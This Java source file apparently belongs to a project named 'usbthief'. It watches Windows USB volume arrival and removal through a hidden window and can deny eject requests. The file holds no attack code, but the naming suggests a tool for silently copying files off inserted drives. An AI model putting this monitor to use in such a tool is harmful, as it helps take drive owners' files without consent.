package com.superredrock.usbthief.core;

import com.sun.jna.Pointer;
import com.sun.jna.Structure;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.Guid.GUID;
import com.sun.jna.platform.win32.WinDef.*;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.platform.win32.WinUser.*;

import javax.swing.SwingUtilities;
import java.util.concurrent.ConcurrentHashMap;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class UsbHotplugMonitor {

    private static final Logger logger = LogManager.getLogger(UsbHotplugMonitor.class);

    private static final int WM_DEVICECHANGE = 0x0219;
    private static final int DBT_DEVICEARRIVAL = 0x8000;
    private static final int DBT_DEVICEREMOVECOMPLETE = 0x8004;
    private static final int DBT_DEVICEQUERYREMOVE = 0x8001;
    private static final int BROADCAST_QUERY_DENY = 0x424D5144;
    private static final int DBT_DEVTYP_VOLUME = 2;
    private static final int DBT_DEVTYP_DEVICEINTERFACE = 5;
    private static final int DBT_DEVTYP_HANDLE = 6;

    private static final GUID GUID_DEVINTERFACE_DISK = new GUID("53F56307-B6BF-11D0-94F2-00A0C91EFB8B");

    private final User32 user32 = User32.INSTANCE;

    private volatile HWND hwnd;
    private volatile boolean running;
    private volatile Thread messageThread;

    private VolumeListener volumeListener;
    private DeviceListener deviceListener;
    private HDEVNOTIFY hDeviceNotify;

    private final ConcurrentHashMap<String, VolumeHandleReg> volumeHandleRegs = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<Long, String> handleToDriveLetter = new ConcurrentHashMap<>();

    public interface VolumeListener {
        void onVolumeArrival(String driveLetter);
        void onVolumeRemoval(String driveLetter);

        default boolean onVolumeQueryRemove(String driveLetter) {
            return true;
        }
    }

    public interface DeviceListener {
        void onDeviceArrival(String dbccName);
        void onDeviceRemoval(String dbccName);
    }

    // ========== Broadcast structures ==========

    @Structure.FieldOrder({"dbch_size", "dbch_devicetype", "dbch_reserved"})
    public static class DEV_BROADCAST_HDR extends Structure {
        public int dbch_size;
        public int dbch_devicetype;
        public int dbch_reserved;

        public DEV_BROADCAST_HDR() { super(); }
        public DEV_BROADCAST_HDR(Pointer p) { super(p); read(); }
    }

    @Structure.FieldOrder({"dbcv_size", "dbcv_devicetype", "dbcv_reserved", "dbcv_unitmask", "dbcv_flags"})
    public static class DEV_BROADCAST_VOLUME extends Structure {
        public int dbcv_size;
        public int dbcv_devicetype;
        public int dbcv_reserved;
        public int dbcv_unitmask;
        public int dbcv_flags;

        public DEV_BROADCAST_VOLUME() { super(); }
        public DEV_BROADCAST_VOLUME(Pointer p) { super(p); read(); }

        public String getDriveLetter() {
            int bitPos = Integer.numberOfTrailingZeros(dbcv_unitmask);
            if (bitPos < 26) {
                return (char) ('A' + bitPos) + ":";
            }
            return null;
        }
    }

    @Structure.FieldOrder({"dbcc_size", "dbcc_devicetype", "dbcc_reserved", "dbcc_classguid", "dbcc_name"})
    public static class DEV_BROADCAST_DEVICEINTERFACE extends Structure {
        public int dbcc_size;
        public int dbcc_devicetype;
        public int dbcc_reserved;
        public GUID dbcc_classguid;
        public char[] dbcc_name = new char[1];

        public DEV_BROADCAST_DEVICEINTERFACE() { super(); }
        public DEV_BROADCAST_DEVICEINTERFACE(Pointer p) { super(p); read(); }

        public String getDeviceName() {
            Pointer p = getPointer();
            int nameOffset = 4 + 4 + 4 + 16;
            return p.getWideString(nameOffset);
        }
    }

    @Structure.FieldOrder({"dbch_size", "dbch_devicetype", "dbch_reserved", "dbch_handle", "dbch_hdevnotify"})
    public static class DEV_BROADCAST_HANDLE extends Structure {
        public int dbch_size;
        public int dbch_devicetype;
        public int dbch_reserved;
        public HANDLE dbch_handle;
        public HDEVNOTIFY dbch_hdevnotify;

        public DEV_BROADCAST_HANDLE() { super(); }
        public DEV_BROADCAST_HANDLE(Pointer p) { super(p); read(); }
    }

    private record VolumeHandleReg(HANDLE volumeHandle, HDEVNOTIFY notifyHandle) {
    }

    // ========== Window procedure ==========

    private final WindowProc windowProc = new WindowProc() {
        @Override
        public LRESULT callback(HWND hwnd, int msg, WPARAM wParam, LPARAM lParam) {
            if (msg == WM_DEVICECHANGE) {
                Pointer lParamPtr = null;
                if (lParam != null) {
                    long val = lParam.longValue();
                    if (val != 0) lParamPtr = new Pointer(val);
                }
                LRESULT result = handleDeviceChange(wParam, lParamPtr);
                return result != null ? result : new LRESULT(1);
            }
            return user32.DefWindowProc(hwnd, msg, wParam, lParam);
        }
    };

    private LRESULT handleDeviceChange(WPARAM wParam, Pointer lParam) {
        int eventType = wParam.intValue();

        if (lParam == null) {
            return null;
        }

        // Handle DBT_DEVICEQUERYREMOVE synchronously (must return value to Windows)
        if (eventType == DBT_DEVICEQUERYREMOVE) {
            DEV_BROADCAST_HDR hdr = new DEV_BROADCAST_HDR(lParam);
            if (hdr.dbch_devicetype == DBT_DEVTYP_HANDLE) {
                DEV_BROADCAST_HANDLE dbh = new DEV_BROADCAST_HANDLE(lParam);
                String driveLetter = null;
                if (dbh.dbch_handle != null) {
                    driveLetter = handleToDriveLetter.get(Pointer.nativeValue(dbh.dbch_handle.getPointer()));
                }

                if (driveLetter != null && volumeListener != null) {
                    boolean allow = volumeListener.onVolumeQueryRemove(driveLetter);
                    logger.info("DBT_DEVICEQUERYREMOVE for {}: {}", driveLetter, allow ? "allowed" : "denied");
                    if (allow) {
                        cleanupVolumeHandle(driveLetter);
                    }
                    return allow ? new LRESULT(1) : new LRESULT(BROADCAST_QUERY_DENY);
                }
            }
            return new LRESULT(1);
        }

        if ((eventType != DBT_DEVICEARRIVAL && eventType != DBT_DEVICEREMOVECOMPLETE)) {
            return null;
        }

        DEV_BROADCAST_HDR hdr = new DEV_BROADCAST_HDR(lParam);

        if (hdr.dbch_devicetype == DBT_DEVTYP_VOLUME) {
            DEV_BROADCAST_VOLUME volume = new DEV_BROADCAST_VOLUME(lParam);
            String driveLetter = volume.getDriveLetter();

            if (driveLetter != null) {
                SwingUtilities.invokeLater(() -> {
                    if (volumeListener != null) {
                        if (eventType == DBT_DEVICEARRIVAL) {
                            logger.info("Volume arrived: {}", driveLetter);
                            volumeListener.onVolumeArrival(driveLetter);
                        } else {
                            logger.info("Volume removed: {}", driveLetter);
                            volumeListener.onVolumeRemoval(driveLetter);
                        }
                    }
                });
            }
        } else if (hdr.dbch_devicetype == DBT_DEVTYP_DEVICEINTERFACE) {
            DEV_BROADCAST_DEVICEINTERFACE device = new DEV_BROADCAST_DEVICEINTERFACE(lParam);
            String dbccName = device.getDeviceName();

            if (dbccName != null) {
                SwingUtilities.invokeLater(() -> {
                    if (deviceListener != null) {
                        if (eventType == DBT_DEVICEARRIVAL) {
                            logger.info("Device arrived: {}", dbccName);
                            deviceListener.onDeviceArrival(dbccName);
                        } else {
                            logger.info("Device removed: {}", dbccName);
                            deviceListener.onDeviceRemoval(dbccName);
                        }
                    }
                });
            }
        }
        return null;
    }

    // ========== Volume handle registration ==========

    public void registerVolumeHandle(String driveLetter) {
        if (hwnd == null) {
            logger.warn("Cannot register volume handle: window not created");
            return;
        }

        String volumePath = "\\\\.\\" + driveLetter;
        HANDLE hFile = Kernel32.INSTANCE.CreateFile(
                volumePath,
                Kernel32.GENERIC_READ,
                Kernel32.FILE_SHARE_READ | Kernel32.FILE_SHARE_WRITE,
                null,
                Kernel32.OPEN_EXISTING,
                0,
                null
        );

        if (hFile == null || WinBase.INVALID_HANDLE_VALUE.equals(hFile)) {
            logger.warn("Failed to open volume handle for {}: error {}", driveLetter, Kernel32.INSTANCE.GetLastError());
            return;
        }

        DEV_BROADCAST_HANDLE filter = new DEV_BROADCAST_HANDLE();
        filter.dbch_size = filter.size();
        filter.dbch_devicetype = DBT_DEVTYP_HANDLE;
        filter.dbch_reserved = 0;
        filter.dbch_handle = hFile;
        filter.write();

        HDEVNOTIFY hNotify = user32.RegisterDeviceNotification(hwnd, filter, User32.DEVICE_NOTIFY_WINDOW_HANDLE);
        if (hNotify == null) {
            logger.warn("Failed to register handle notification for {}: error {}", driveLetter, Kernel32.INSTANCE.GetLastError());
            Kernel32.INSTANCE.CloseHandle(hFile);
            return;
        }

        long handleValue = Pointer.nativeValue(hFile.getPointer());
        volumeHandleRegs.put(driveLetter, new VolumeHandleReg(hFile, hNotify));
        handleToDriveLetter.put(handleValue, driveLetter);
        logger.info("Registered volume handle for eject detection: {} (handle=0x{})", driveLetter, Long.toHexString(handleValue));
    }

    public void unregisterVolumeHandle(String driveLetter) {
        cleanupVolumeHandle(driveLetter);
    }

    private void cleanupVolumeHandle(String driveLetter) {
        VolumeHandleReg reg = volumeHandleRegs.remove(driveLetter);
        if (reg != null) {
            long handleValue = Pointer.nativeValue(reg.volumeHandle.getPointer());
            handleToDriveLetter.remove(handleValue);
            user32.UnregisterDeviceNotification(reg.notifyHandle);
            Kernel32.INSTANCE.CloseHandle(reg.volumeHandle);
            logger.info("Unregistered volume handle: {}", driveLetter);
        }
    }

    // ========== Public API ==========

    public void setVolumeListener(VolumeListener listener) {
        this.volumeListener = listener;
    }

    public void setDeviceListener(DeviceListener listener) {
        this.deviceListener = listener;
    }

    public synchronized void start() {
        if (running) {
            throw new IllegalStateException("Monitor already running");
        }

        messageThread = Thread.ofPlatform()
                .name("UsbHotplugMonitor-MsgThread")
                .daemon(true)
                .start(() -> {
                    String className = "UsbThiefMonitorClass";
                    WNDCLASSEX wndClass = new WNDCLASSEX();
                    wndClass.lpszClassName = className;
                    wndClass.lpfnWndProc = windowProc;
                    wndClass.hInstance = Kernel32.INSTANCE.GetModuleHandle(null);
                    user32.RegisterClassEx(wndClass);

                    hwnd = user32.CreateWindowEx(
                            0, className, "UsbThiefMonitor", 0,
                            0, 0, 0, 0,
                            null, null, wndClass.hInstance, null
                    );

                    if (hwnd == null) {
                        logger.error("Failed to create hidden window for UsbHotplugMonitor");
                        return;
                    }

                    hDeviceNotify = registerDeviceInterfaceNotification(hwnd);
                    if (hDeviceNotify == null) {
                        int error = Kernel32.INSTANCE.GetLastError();
                        logger.warn("Failed to register for device interface notifications, error: {} (continuing with volume-only mode)", error);
                    }

                    running = true;
                    logger.info("USB hot-plug monitor started with hidden window hwnd={}", hwnd);

                    MSG msg = new MSG();
                    while (user32.GetMessage(msg, null, 0, 0) > 0) {
                        user32.TranslateMessage(msg);
                        user32.DispatchMessage(msg);
                    }

                    for (String dl : volumeHandleRegs.keySet().toArray(new String[0])) {
                        cleanupVolumeHandle(dl);
                    }
                    if (hDeviceNotify != null) {
                        user32.UnregisterDeviceNotification(hDeviceNotify);
                        hDeviceNotify = null;
                    }
                    user32.DestroyWindow(hwnd);
                    user32.UnregisterClass(className, wndClass.hInstance);
                    hwnd = null;
                    running = false;
                    logger.info("USB hot-plug monitor message loop exited");
                });
    }

    public synchronized void start(long hwndValue) {
        start();
    }

    public synchronized void stop() {
        if (!running || hwnd == null) {
            return;
        }

        user32.PostMessage(hwnd, WinUser.WM_QUIT, null, null);

        if (messageThread != null) {
            try {
                messageThread.join(3000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            messageThread = null;
        }

        logger.info("USB hot-plug monitor stopped");
    }

    public boolean isRunning() {
        return running;
    }

    // ========== Private helpers ==========

    private HDEVNOTIFY registerDeviceInterfaceNotification(HWND hwnd) {
        DEV_BROADCAST_DEVICEINTERFACE filter = new DEV_BROADCAST_DEVICEINTERFACE();
        filter.dbcc_size = filter.size();
        filter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
        filter.dbcc_reserved = 0;
        filter.dbcc_classguid = GUID_DEVINTERFACE_DISK;
        filter.write();

        HDEVNOTIFY result = user32.RegisterDeviceNotification(
                hwnd, filter, User32.DEVICE_NOTIFY_WINDOW_HANDLE
        );

        if (result == null) {
            logger.error("RegisterDeviceNotification failed, error: {}", Kernel32.INSTANCE.GetLastError());
        } else {
            logger.info("Device interface notification registered: {}", result);
        }

        return result;
    }
}
